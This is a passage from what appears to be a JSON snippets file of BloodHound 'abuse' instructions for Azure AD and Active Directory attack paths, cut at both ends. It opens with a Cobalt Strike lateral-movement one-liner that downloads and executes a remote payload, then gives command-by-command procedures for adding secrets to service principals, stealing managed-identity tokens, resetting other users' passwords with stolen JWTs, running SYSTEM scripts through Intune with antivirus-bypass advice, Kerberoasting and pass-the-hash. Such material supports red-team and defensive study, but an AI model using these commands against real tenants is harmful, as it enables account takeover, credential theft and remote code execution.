            "Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.",
            "```sh",
            "Disconnect-PSSession -Session $$session",
            "Remove-PSSession -Session $$session",
            "```",
            "An example of running through this cobalt strike for lateral movement is as follows:",
            "```sh",
            "powershell $$session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $$session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $$session; Remove-PSSession -Session $$session",
            "```"
        ]
    },
    "AZAddMembers common abuse (bloodhound)": {
        "description": "The ability to add other principals to an Azure security group",
        "prefix": "AZAddMembers",
        "body": [
            "The ability to add other principals to an Azure security group",
            "To Abuse 'AZAddMembers' commonly: ",
            "Via the Azure portal:",
            "Find the group in your tenant (Azure Active Directory -> Groups -> Find Group in list)Click the group from the listIn the left pane, click \"Members\"At the top, click \"Add members\"Find the principals you want to add to the group and click them, then click \"select\" at the bottomYou should see a message in the top right saying \"Member successfully added\"",
            "Via PowerZure: Add-AzureADGroup -User [UPN] -Group [Group name]"
        ]
    },
    "AZAddSecret common abuse (bloodhound)": {
        "description": "Azure provides several systems and mechanisms for granting control of securable objects within Azure Active Directory, including tenant-scoped admin roles, object-scoped admin roles, explicit object ownership, and API permissions.When a principal has been granted \"Cloud App Admin\" or \"App Admin\" against the tenant, that principal gains the ability to add new secrets to all Service Principals and App Registrations. Additionally, a principal that has been granted \"Cloud App Admin\" or \"App Admin\" against, or explicit ownership of a Service Principal or App Registration gains the ability to add secrets to that particular object.",
        "prefix": "AZAddSecret",
        "body": [
            "Azure provides several systems and mechanisms for granting control of securable objects within Azure Active Directory, including tenant-scoped admin roles, object-scoped admin roles, explicit object ownership, and API permissions.When a principal has been granted \"Cloud App Admin\" or \"App Admin\" against the tenant, that principal gains the ability to add new secrets to all Service Principals and App Registrations. Additionally, a principal that has been granted \"Cloud App Admin\" or \"App Admin\" against, or explicit ownership of a Service Principal or App Registration gains the ability to add secrets to that particular object.",
            "To Abuse 'AZAddSecret' commonly: ",
            "There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the \u201cCertificates & secrets\u201d tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API.",
            "No matter what kind of control you have, you will be able to perform this abuse by using BARK\u2019s New-AppRegSecret or New-ServicePrincipalSecret functions.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",
            "```sh",
            "$$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk\u2026\" -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK\u2019s New-AppRegSecret to add a new secret to the target application:",
            "```sh",
            "New-AppRegSecret -AppRegObjectID \"d878\u2026\" -Token $$MGToken.access_token",
            "```",
            "The output will contain the plain-text secret you just created for the target app:",
            "```sh",
            "PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID \"d878\u2026\" -Token $$MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31\u2026 AppRegObjectId d878\u2026",
            "```",
            "With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK\u2019s Get-MSGraphToken function:",
            "```sh",
            "PS /Users/andyrobbins> $$SPToken = Get-MSGraphToken `-ClientID \"4d31\u2026\" `-ClientSecret \"odg8Q~...\" `-TenantName \"contoso.onmicrosoft.com\" PS /Users/andyrobbins> $$SPToken.access_token eyJ0eXAiOiJKV1QiLCJub\u2026",
            "```",
            "Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."
        ]
    },
    "AZAvereContributor common abuse (bloodhound)": {
        "description": "Any principal granted the Avere Contributor role, scoped to the affected VM, can reset the built-in administrator password on the VM.",
        "prefix": "AZAvereContributor",
        "body": [
            "Any principal granted the Avere Contributor role, scoped to the affected VM, can reset the built-in administrator password on the VM.",
            "To Abuse 'AZAvereContributor' commonly: ",
            "The Avere Contributor role allows you to run SYSTEM commands on the VM",
            "Via PowerZure:",
            "[Invoke-AzureRunCommand](http://Invoke-AzureRunCommand)",
            "[Invoke-AzureRunMSBuild](http://Invoke-AzureRunMSBuild)",
            "[Invoke-AzureRunProgram](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram)"
        ]
    },
    "AZContains common abuse (bloodhound)": {
        "description": "This indicates that the parent object contains the child object, such as a resource group containing a virtual machine, or a tenant \"containing\" a subscription.",
        "prefix": "AZContains",
        "body": [
            "This indicates that the parent object contains the child object, such as a resource group containing a virtual machine, or a tenant \"containing\" a subscription.",
            "To Abuse 'AZContains' commonly: ",
            "There is no abuse necessary, but any roles scoped on a parent object will descend down to all child objects."
        ]
    },
    "AZContributor common abuse (bloodhound)": {
        "description": "The contributor role grants almost all abusable privileges in all circumstances, with some exceptions. Those exceptions are not collected by AzureHound.",
        "prefix": "AZContributor",
        "body": [
            "The contributor role grants almost all abusable privileges in all circumstances, with some exceptions. Those exceptions are not collected by AzureHound.",
            "To Abuse 'AZContributor' commonly: ",
            "This depends on what the target object is:",
            "Key Vault: You can read secrets and alter access policies (grant yourself access to read secrets)",
            "Automation Account: You can create a new runbook that runs as the Automation Account, and edit existing runbooks. Runbooks can be used to authenticate as the Automation Account and abuse privileges held by the Automation Account. If the Automation Account is using a 'RunAs' account, you can gather the certificate used to login and impersonate that account.",
            "Virtual Machine: Run SYSTEM commands on the VM",
            "Resource Group: NOT abusable, and not collected by AzureHound",
            "Via PowerZure:",
            "[Get-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent)",
            "[Export-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent)",
            "[Get-AzureRunAsCertificate](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunascertificate)",
            "[Get-AzureRunbookContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunbookcontent)",
            "[Invoke-AzureRunCommand](http://Invoke-AzureRunCommand)",
            "[Invoke-AzureRunMSBuild](http://Invoke-AzureRunMSBuild)",
            "[Invoke-AzureRunProgram](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram)"
        ]
    },
    "AZExecuteCommand common abuse (bloodhound)": {
        "description": "Principals with the Intune Administrators role are able to execute arbitrary PowerShell scripts on devices that are joined to the Azure Active Directory tenant.",
        "prefix": "AZExecuteCommand",
        "body": [
            "Principals with the Intune Administrators role are able to execute arbitrary PowerShell scripts on devices that are joined to the Azure Active Directory tenant.",
            "To Abuse 'AZExecuteCommand' commonly: ",
            "First, have your PowerShell script ready to go and save it somewhere as a PS1 file. Take all the necessary operational security (opsec) and AMSI-bypass steps you want at this point, keeping in mind the script will run as the SYSTEM user unless you specify otherwise. Also keep in mind that the script will be written to disk, so take whatever AV bypass measures you need as well.",
            "Next, log into the Azure web portal as the user with the \u201cIntune Administrator\u201d role activated. After authenticating, access Endpoint Manager at https://endpoint.microsoft.com",
            "Click on \u201cDevices\u201d on the left, which takes you, unsurprisingly, to the devices overview. Click on \u201cScripts\u201d under the \u201cPolicy\u201d section to go to the scripts management page. Click \u201cAdd,\u201d then click \u201cWindows 10\u201d",
            "This will bring you to the \u201cAdd Powershell Script\u201d page. On this first page, you\u2019ll enter a name for the script and a brief description. On the next page, click the folder and then select your PS1 from the common dialogue window. You\u2019ve now got three options to configure, but can leave them all in the default \u201cNo\u201d position. Most interestingly, keeping the first selection as \u201cNo\u201d will cause the script to run as the SYSTEM user",
            "Click next, and you\u2019ll see the page that lets you scope which systems and users this script will execute for. You can choose to assign the script to \u201cAll devices,\u201d \u201cAll users,\u201d or \u201cAll users and devices.\u201d If you leave the \u201cAssign to\u201d dropdown at its default selection of \u201cSelected groups,\u201d you can scope the script to only execute on systems or for users that belong to certain security groups. The choice is yours: run the script on every possible system or constrain it to only run on certain systems by scoping it to existing security groups or by adding specific devices or users to new security groups.",
            "Click \u201cNext\u201d and you\u2019ll see the review page which lets you see what you\u2019re about to do. Click \u201cAdd\u201d and Azure will begin registering the script.",
            "At this point, the script is now ready to run on your target systems. This process works similarly to Group Policy, in that the Intune agent running on each device periodically checks in (by default every hour) with Intune/Endpoint Manager to see if there is a PowerShell script for it to run, so you will need to wait up to an hour for your target system to actually pull the script down and run it."
        ]
    },
    "AZGetCertificates common abuse (bloodhound)": {
        "description": "The ability to read certificates from key vaults",
        "prefix": "AZGetCertificates",
        "body": [
            "The ability to read certificates from key vaults",
            "To Abuse 'AZGetCertificates' commonly: ",
            "Use PowerShell or PowerZure to fetch the certificate from the key vault",
            "Via PowerZure",
            "[Get-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent)",
            "[Export-AzureKeyVaultcontent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent)"
        ]
    },
    "AZGetKeys common abuse (bloodhound)": {
        "description": "The ability to read keys from key vaults",
        "prefix": "AZGetKeys",
        "body": [
            "The ability to read keys from key vaults",
            "To Abuse 'AZGetKeys' commonly: ",
            "Use PowerShell or PowerZure to fetch the key from the key vault",
            "Via PowerZure",
            "[Export-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent)"
        ]
    },
    "AZGetSecrets common abuse (bloodhound)": {
        "description": "The ability to read secrets from key vaults",
        "prefix": "AZGetSecrets",
        "body": [
            "The ability to read secrets from key vaults",
            "To Abuse 'AZGetSecrets' commonly: ",
            "Use PowerShell or PowerZure to fetch the secret from the key vault",
            "Via PowerZure",
            "[Get-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent)"
        ]
    },
    "AZHasRole common abuse (bloodhound)": {
        "description": "This edge indicates that a principal has been granted a particular AzureAD admin role.",
        "prefix": "AZHasRole",
        "body": [
            "This edge indicates that a principal has been granted a particular AzureAD admin role.",
            "To Abuse 'AZHasRole' commonly: ",
            "No abuse is necessary. This edge only indicates that the principal has been granted a particular AzureAD admin role."
        ]
    },
    "AZManagedIdentity common abuse (bloodhound)": {
        "description": "Azure resources like Virtual Machines, Logic Apps, and Automation Accounts can be assigned to either System- or User-Assigned Managed Identities. This assignment allows the Azure resource to authenticate to Azure services as the Managed Identity without needing to know the credential for that Managed Identity. Managed Identities, whether System- or User-Assigned, are AzureAD Service Principals.",
        "prefix": "AZManagedIdentity",
        "body": [
            "Azure resources like Virtual Machines, Logic Apps, and Automation Accounts can be assigned to either System- or User-Assigned Managed Identities. This assignment allows the Azure resource to authenticate to Azure services as the Managed Identity without needing to know the credential for that Managed Identity. Managed Identities, whether System- or User-Assigned, are AzureAD Service Principals.",
            "To Abuse 'AZManagedIdentity' commonly: ",
            "You can modify the Azure RM resource to execute actions against Azure with the privileges of the Managed Identity Service Principal.",
            "It is also possible to extract a JSON Web Token (JWT) for the Service Principal, then use that JWT to authenticate as the Service Principal outside the scope of the Azure RM resource. Here is how you extract the JWT using PowerShell:",
            "```sh",
            "$$tokenAuthURI = $$env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"",
            "$$tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$$env:MSI_SECRET\"} -Uri $$tokenAuthURI",
            "$$tokenResponse.access_token",
            "```",
            "We can then use this JWT to authenticate as the Service Principal to the Microsoft Graph APIs using BARK for example."
        ]
    },
    "AZMemberOf common abuse (bloodhound)": {
        "description": "The  controlled object is a member of the group target object.Groups in Azure Active Directory grant their direct members any privileges the group itself has. If a group has an AzureAD admin role, direct members of the group inherit those permissions.",
        "prefix": "AZMemberOf",
        "body": [
            "The  $CONTROLLED is a member of the group $TARGET.Groups in Azure Active Directory grant their direct members any privileges the group itself has. If a group has an AzureAD admin role, direct members of the group inherit those permissions.",
            "To Abuse 'AZMemberOf' commonly: ",
            "No abuse is necessary. This edge simply indicates that a principal belongs to a security group."
        ]
    },
    "AZOwns common abuse (bloodhound)": {
        "description": "Object ownership means almost all abuses are possible against the target object.",
        "prefix": "AZOwns",
        "body": [
            "Object ownership means almost all abuses are possible against the target object.",
            "To Abuse 'AZOwns' commonly: ",
            "Everything a Contributor can do, with the addition of assigning rights to resources."
        ]
    },
    "AZPrivilegedAuthAdmin common abuse (bloodhound)": {
        "description": "This edge indicates the principal has the Privileged Authentication Administrator role active against the target tenant. Principals with this role can update sensitive properties for all users. Privileged Authentication Administrator can set or reset any authentication method (including passwords) for any user, including Global Administrators.",
        "prefix": "AZPrivilegedAuthAdmin",
        "body": [
            "This edge indicates the principal has the Privileged Authentication Administrator role active against the target tenant. Principals with this role can update sensitive properties for all users. Privileged Authentication Administrator can set or reset any authentication method (including passwords) for any user, including Global Administrators.",
            "To Abuse 'AZPrivilegedAuthAdmin' commonly: ",
            "Set secret for Service Principal (AZAddSecret abuse info)",
            "There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the \u201cCertificates & secrets\u201d tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API.",
            "No matter what kind of control you have, you will be able to perform this abuse by using BARK\u2019s New-AppRegSecret or New-ServicePrincipalSecret functions.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",
            "```sh",
            "$$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk\u2026\" -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK\u2019s New-AppRegSecret to add a new secret to the target application:",
            "```sh",
            "New-AppRegSecret -AppRegObjectID \"d878\u2026\" -Token $$MGToken.access_token",
            "```",
            "The output will contain the plain-text secret you just created for the target app:",
            "```sh",
            "PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID \"d878\u2026\" -Token $$MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31\u2026 AppRegObjectId d878\u2026",
            "```",
            "With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK\u2019s Get-MSGraphToken function:",
            "```sh",
            "PS /Users/andyrobbins> $$SPToken = Get-MSGraphToken `-ClientID \"4d31\u2026\" `-ClientSecret \"odg8Q~...\" `-TenantName \"contoso.onmicrosoft.com\" PS /Users/andyrobbins> $$SPToken.access_token eyJ0eXAiOiJKV1QiLCJub\u2026",
            "```",
            "Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal.",
            "Reset password of user (AZResetPassword abuse info)",
            "There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies.",
            "The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click \"Reset Password\" on the target user\u2019s overview tab.",
            "You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure\u2019s Set-AzureUserPassword cmdlet.",
            "In some situations, you may only have access to your compromised principal\u2019s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user\u2019s JWT from Chrome.",
            "There are at least two ways to reset a user\u2019s password when using a token, depending on the scope of the token and the type of identity associated with the token:",
            "Using an MS Graph-scoped token",
            "If your token is associated with a Service Principal or User, you may set the target\u2019s password to a known value by hitting the MS Graph API.",
            "You can use BARK\u2019s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user\u2019s password:",
            "```sh",
            "$$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID \"<service principal\u2019s app id>\" -ClientSecret \"<service principal\u2019s plain text secret>\" -TenantName \"contoso.onmicrosoft.com\").access_token",
            "```",
            "Then we supply this token, our target user\u2019s ID, and the new password to the Set-AZUserPassword cmdlet:",
            "```sh",
            "Set-AZUserPassword -Token $$MGToken -TargetUserID \"d9644c...\" -Password \"SuperSafePassword12345\"",
            "```",
            "If successful, the output will include a \"204\" status code:",
            "```sh",
            "StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms\u2026 Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]\u2026} RawContentLength : 0 RelationLink : {}",
            "```",
            "Using an Azure Portal-scoped token",
            "You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user\u2019s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK\u2019s Reset-AZUserPassword cmdlet.",
            "You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK\u2019s Get-AzurePortalTokenWithRefreshToken cmdlet:",
            "```sh",
            "$$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $$RefreshToken -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can supply the Portal token to BARK\u2019s Reset-AZUserPassword cmdlet:",
            "```sh",
            "Reset-AZUserPassword -Token $$PortalToken.access_token -TargetUserID \"targetuser@contoso.onmicrosoft.com\"",
            "```",
            "If successful, the response will look like this:",
            "```sh",
            "StatusCode : 200 StatusDescription : OK Content : \"Gafu1918\" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no\u2026 Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]\u2026} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}",
            "```",
            "As you can see, the plain-text value of the user\u2019s password is visible in the \"Content\" parameter value."
        ]
    },
    "AZPrivilegedRoleAdmin common abuse (bloodhound)": {
        "description": "The Privileged Role Admin role can grant any other admin role to another principal at the tenant level.",
        "prefix": "AZPrivilegedRoleAdmin",
        "body": [
            "The Privileged Role Admin role can grant any other admin role to another principal at the tenant level.",
            "To Abuse 'AZPrivilegedRoleAdmin' commonly: ",
            "Activate the Global Admin role for yourself or for another user using PowerZure or PowerShell."
        ]
    },
    "AZResetPassword common abuse (bloodhound)": {
        "description": "The ability to change another user's password without knowing their current password",
        "prefix": "AZResetPassword",
        "body": [
            "The ability to change another user's password without knowing their current password",
            "To Abuse 'AZResetPassword' commonly: ",
            "There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies.",
            "The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click \"Reset Password\" on the target user\u2019s overview tab.",
            "You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure\u2019s Set-AzureUserPassword cmdlet.",
            "In some situations, you may only have access to your compromised principal\u2019s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user\u2019s JWT from Chrome.",
            "There are at least two ways to reset a user\u2019s password when using a token, depending on the scope of the token and the type of identity associated with the token:",
            "Using an MS Graph-scoped token",
            "If your token is associated with a Service Principal or User, you may set the target\u2019s password to a known value by hitting the MS Graph API.",
            "You can use BARK\u2019s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user\u2019s password:",
            "```sh",
            "$$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID \"<service principal\u2019s app id>\" -ClientSecret \"<service principal\u2019s plain text secret>\" -TenantName \"contoso.onmicrosoft.com\").access_token",
            "```",
            "Then we supply this token, our target user\u2019s ID, and the new password to the Set-AZUserPassword cmdlet:",
            "```sh",
            "Set-AZUserPassword -Token $$MGToken -TargetUserID \"d9644c...\" -Password \"SuperSafePassword12345\"",
            "```",
            "If successful, the output will include a \"204\" status code:",
            "```sh",
            "StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms\u2026 Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]\u2026} RawContentLength : 0 RelationLink : {}",
            "```",
            "Using an Azure Portal-scoped token",
            "You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user\u2019s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK\u2019s Reset-AZUserPassword cmdlet.",
            "You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK\u2019s Get-AzurePortalTokenWithRefreshToken cmdlet:",
            "```sh",
            "$$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $$RefreshToken -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can supply the Portal token to BARK\u2019s Reset-AZUserPassword cmdlet:",
            "```sh",
            "Reset-AZUserPassword -Token $$PortalToken.access_token -TargetUserID \"targetuser@contoso.onmicrosoft.com\"",
            "```",
            "If successful, the response will look like this:",
            "```sh",
            "StatusCode : 200 StatusDescription : OK Content : \"Gafu1918\" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no\u2026 Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]\u2026} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}",
            "```",
            "As you can see, the plain-text value of the user\u2019s password is visible in the \"Content\" parameter value."
        ]
    },
    "AZUserAccessAdministrator common abuse (bloodhound)": {
        "description": "The User Access Administrator role can manage user access to Azure resources, assign roles in Azure RBAC, and assign the Owner role to themselves or others.",
        "prefix": "AZUserAccessAdministrator",
        "body": [
            "The User Access Administrator role can manage user access to Azure resources, assign roles in Azure RBAC, and assign the Owner role to themselves or others.",
            "To Abuse 'AZUserAccessAdministrator' commonly: ",
            "This role can be used to grant yourself or another principal any privilege you want against Automation Accounts, VMs, Key Vaults, and Resource Groups. For example, you can make yourself an administrator of an Azure Subscription by assigning the Owner role at the Subscription scope.",
            "The simplest way to execute this attack is to use the Azure portal to add a new, abusable role assignment against the target object for yourself.",
            "If this role is assigned to a Service Principal, you won't be able to authenticate directly to the Azure portal. In this case:",
            "You'll need to acquire a bearer token for the service principal with AzureRM as the audience. This can be done using BARK's Get-AzureRMTokenWithClientCredentials cmdlet.",
            "Using that token, you can make a call to the AzureRM API to create a new role assignment on the target object, such as assigning yourself the Owner role. This can be done using BARK's New-AzureRMRoleAssignment cmdlet."
        ]
    },
    "AZGlobalAdmin common abuse (bloodhound)": {
        "description": "This edge indicates the principal has the Global Admin role active against the target tenant. In other words, the principal is a Global Admin. Global Admins can do almost anything against almost every object type in the tenant, this is the highest privilege role in Azure.",
        "prefix": "AZGlobalAdmin",
        "body": [
            "This edge indicates the principal has the Global Admin role active against the target tenant. In other words, the principal is a Global Admin. Global Admins can do almost anything against almost every object type in the tenant, this is the highest privilege role in Azure.",
            "To Abuse 'AZGlobalAdmin' commonly: ",
            "As a Global Admin, you can change passwords, run commands on VMs, read key vault secrets, activate roles for other users, etc.",
            "Via PowerZure",
            "[https://powerzure.readthedocs.io/en/latest/Functions/operational.html](https://powerzure.readthedocs.io/en/latest/Functions/operational.html)",
            "For Global Admin to be able to abuse Azure resources, you must first grant yourself the 'User Access Administrator' role in Azure RBAC. This is done through a toggle button in the portal, or via the PowerZure function Set-AzureElevatedPrivileges.",
            "Once that role is applied to account, you can then add yourself as an Owner to all subscriptions in the tenant"
        ]
    },
    "AZAppAdmin common abuse (bloodhound)": {
        "description": "Principals with the Application Admin role can control tenant-resident apps.",
        "prefix": "AZAppAdmin",
        "body": [
            "Principals with the Application Admin role can control tenant-resident apps.",
            "To Abuse 'AZAppAdmin' commonly: ",
            "Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."
        ]
    },
    "AZCloudAppAdmin common abuse (bloodhound)": {
        "description": "Principals with the Cloud App Admin role can control tenant-resident apps",
        "prefix": "AZCloudAppAdmin",
        "body": [
            "Principals with the Cloud App Admin role can control tenant-resident apps",
            "To Abuse 'AZCloudAppAdmin' commonly: ",
            "Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."
        ]
    },
    "AZRunsAs common abuse (bloodhound)": {
        "description": "The Azure App runs as the Service Principal when it needs to authenticate to the tenant",
        "prefix": "AZRunsAs",
        "body": [
            "The Azure App runs as the Service Principal when it needs to authenticate to the tenant",
            "To Abuse 'AZRunsAs' commonly: ",
            "This edge should be taken into consideration when abusing control of an app. Apps authenticate with service principals to the tenant, so if you have control of an app, what you are abusing is that control plus the fact that the app runs as a privileged service principal",
            "Use the [Microsoft Graph API](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=http) to add a new client secret to the Azure Application.Use the [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) to authenticate as the Service Principal.Proceed to access additional Azure resources under the control of the Service Principal."
        ]
    },
    "AZVMAdminLogin common abuse (bloodhound)": {
        "description": "When a virtual machine is configured to allow logon with Azure AD credentials, the VM automatically has certain principals added to its local administrators group, including any principal granted the Virtual Machine Administrator Login (or \"VMAL\") admin role.Any principal granted this role, scoped to the affected VM, can connect to the VM via RDP and will be granted local admin rights on the VM.",
        "prefix": "AZVMAdminLogin",
        "body": [
            "When a virtual machine is configured to allow logon with Azure AD credentials, the VM automatically has certain principals added to its local administrators group, including any principal granted the Virtual Machine Administrator Login (or \"VMAL\") admin role.Any principal granted this role, scoped to the affected VM, can connect to the VM via RDP and will be granted local admin rights on the VM.",
            "To Abuse 'AZVMAdminLogin' commonly: ",
            "Connect to the VM via RDP and you will be granted local admin rights on the VM."
        ]
    },
    "AZVMContributor common abuse (bloodhound)": {
        "description": "The Virtual Machine contributor role grants almost all abusable privileges against Virtual Machines.",
        "prefix": "AZVMContributor",
        "body": [
            "The Virtual Machine contributor role grants almost all abusable privileges against Virtual Machines.",
            "To Abuse 'AZVMContributor' commonly: ",
            "The Virtual Machine Contributor role allows you to run SYSTEM commands on the VM",
            "Via PowerZure:",
            "[Invoke-AzureRunCommand](http://Invoke-AzureRunCommand)",
            "[Invoke-AzureRunMSBuild](http://Invoke-AzureRunMSBuild)",
            "[Invoke-AzureRunProgram](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram)"
        ]
    },
    "WriteSPN linux abuse (bloodhound)": {
        "description": "This entity has the ability to write to the \"serviceprincipalname\" attribute to the  target object.",
        "prefix": "WriteSPN",
        "body": [
            "This entity has the ability to write to the \"serviceprincipalname\" attribute to the  $TARGET.",
            "To Abuse 'WriteSPN' on linux: ",
            "A targeted kerberoast attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).",
            "```sh",
            "targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'",
            "```",
            "The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.",
            "The recovered hash can be cracked offline using the tool of your choice."
        ]
    },
    "AddSelf linux abuse (bloodhound)": {
        "description": "This entity has the ability to add itself, to the group target object. Because of security group delegation, the members of a security group have the same privileges as that group.By adding itself to the group, controlled object will gain the same privileges that target object already has.",
        "prefix": "AddSelf",
        "body": [
            "This entity has the ability to add itself, to the group $TARGET. Because of security group delegation, the members of a security group have the same privileges as that group.By adding itself to the group, $CONTROLLED will gain the same privileges that $TARGET already has.",
            "To Abuse 'AddSelf' on linux: ",
            "Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:",
            "```sh",
            "net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```",
            "It can also be done with pass-the-hash using [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.",
            "```sh",
            "pth-net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\"",
            "```",
            "Finally, verify that the user was successfully added to the group:",
            "```sh",
            "net rpc group members \"TargetGroup\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```"
        ]
    },
    "AddKeyCredentialLink linux abuse (bloodhound)": {
